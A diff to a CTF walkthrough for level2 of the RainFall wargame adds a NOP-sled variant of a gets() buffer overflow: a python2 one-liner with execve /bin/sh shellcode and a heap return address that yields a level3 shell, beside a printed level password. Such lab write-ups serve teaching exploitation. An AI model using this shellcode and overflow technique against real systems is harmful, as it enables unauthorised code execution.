@@ -1,6 +1,6 @@
 # Level2
 
-When we take a look at the [decom](./level2_decomp.c), we notice the use of `gets()` a line to check if an address is located in the `0xb0000000` range.
+When we take a look at the [decomp](./level2_decomp.c), we notice the use of `gets()` a line to check if an address is located in the `0xb0000000` range.
 We can also see a call to `strdup()`.
 
 ## Exploit
@@ -13,7 +13,7 @@ aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnoooopppp
 aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppJ����
 ```
 
-Here we can notice that the buffer is 64 chars long. Nice we found one of the components!
+Here we can see that the buffer is 64 chars long. Nice we found one of the components!
 
 So we need to find the return address and where it is located compared to our buffer. To do that we will use the same technique we used to find the size of our buffer such as:
 
@@ -58,6 +58,25 @@ j
  X�Rh//shh/bin��1�̀aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�
 cat /home/user/level3/.pass
 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+```
+
+### Slight variation using NOP-slide
+
+We can also use another technique called NOP-sliding/sled which means basicaly; filling a part of memory with NO-OPERATION asm instructions or `\x90`.
+
+The payload will slightly change:
+
+`[NOP slide] + [payload] + [filler] + [malloc addr]`
+
+Which will result into this:
+
+```bash
+level2@RainFall:~$ python2 -c 'print "\x90"*43 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "a"*16 + "\x08\xa0\x04\x08"' > /var/crash/shellcode.exploit
+level2@RainFall:~$ cat /var/crash/shellcode.exploit - | ./level2
+�������������������������������������������j
+                                            X�Rh//shh/bin��1��aaaaaaaaaaa�
+whoami
+level3
 ```
 
 ## Flag
